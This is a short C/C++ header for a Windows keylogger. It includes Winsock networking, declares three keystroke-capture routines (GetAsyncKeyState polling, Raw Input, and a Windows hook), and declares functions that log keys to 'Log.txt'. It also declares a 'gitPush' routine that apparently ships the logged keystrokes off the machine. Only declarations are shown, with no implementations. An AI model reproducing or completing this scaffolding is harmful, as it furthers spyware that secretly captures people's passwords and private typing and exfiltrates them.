#include <WinSock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <Windows.h>

#pragma warning (disable : 4996)
#pragma comment (lib, "ws2_32.lib")

extern bool caps, numLk, scrLk;

void KeyLogger_GetAsyncKeyState();
void KeyLogger_RawInput();
void KeyLogger_SetWindowsHook();
void Log(char* input, const char fileName[] = "Log.txt");
bool LogKey(int key);
void gitPush(char* message);

